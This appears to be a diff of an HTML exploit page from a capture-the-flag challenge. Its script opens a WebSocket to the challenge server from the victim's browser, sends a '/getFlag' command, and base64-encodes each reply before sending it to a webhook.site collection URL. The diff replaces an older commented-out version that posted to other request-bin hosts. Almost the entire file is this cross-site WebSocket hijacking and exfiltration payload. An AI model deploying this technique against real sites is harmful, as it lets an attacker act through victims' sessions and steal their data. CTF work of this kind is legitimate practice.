@@ -1,35 +1,34 @@
 <html>
+
 <head>
   <title>Document</title>
   <!-- <script src="https://webhook.site/a80c813f-7fdc-4a90-bad0-00ee94384cfd/test.js"></script> -->
 </head>
+
 <body>
+
   <script>
     fetch("https://webhook.site/a80c813f-7fdc-4a90-bad0-00ee94384cfd?_____INIT=1")
+
+    /* ---------- 0. 스크립트 실행 확인 ---------- */
+    fetch('https://webhook.site/a80c813f-7fdc-4a90-bad0-00ee94384cfd?status=loaded')
+      .catch(() => { });
+
+    /* ---------- 1. WebSocket 열고 /getFlag 전송 ---------- */
+    const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com/');
+
+    ws.addEventListener('open', () => {
+      ws.send(JSON.stringify({ message: '/getFlag' }));
+    });
+
+    /* ---------- 2. 플래그 수신 → 외부 서버로 전송 ---------- */
+    function exfil(tag, data) {
+      const payload = encodeURIComponent(btoa(data));      // base64 → URL-safe
+      fetch(`https://webhook.site/a80c813f-7fdc-4a90-bad0-00ee94384cfd/?${tag}=${payload}`).catch(() => { });
+    }
+    ws.addEventListener('message', ev => exfil('flag', ev.data));
+    ws.addEventListener('error', ev => exfil('error', ev.message || 'ws_error'));
   </script>
 </body>
-  <!-- <script>
-  /* ---------- 0. 스크립트 실행 확인 ---------- */
-  fetch('https://kpqfufz.request.dreamhack.games/?status=loaded')
-    .catch(()=>{});
 
-  /* ---------- 1. WebSocket 열고 /getFlag 전송 ---------- */
-  const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com/');
-
-  ws.addEventListener('open', () => {
-    ws.send(JSON.stringify({ message: '/getFlag' }));
-  });
-
-  /* ---------- 2. 플래그 수신 → 외부 서버로 전송 ---------- */
-  function exfil(tag, data) {
-    const payload = encodeURIComponent(btoa(data));      // base64 → URL-safe
-    fetch(`https://kpqfufz.request.dreamhack.games/?${tag}=${payload}`).catch(()=>{});
-    /* 혼합-콘텐츠 차단을 피하려면 HTTPS 엔드포인트만 사용하는 편이 안전합니다.
-      server.dottak.me 가 HTTPS를 지원한다면 아래 한 줄을 https:// 로 교체해 주십시오. */
-    // fetch(`http://server.dottak.me/?${tag}=${payload}`).catch(()=>{});
-  }
-
-  ws.addEventListener('message', ev => exfil('flag', ev.data));
-  ws.addEventListener('error',   ev => exfil('error', ev.message || 'ws_error'));
-  </script> -->
 </html>
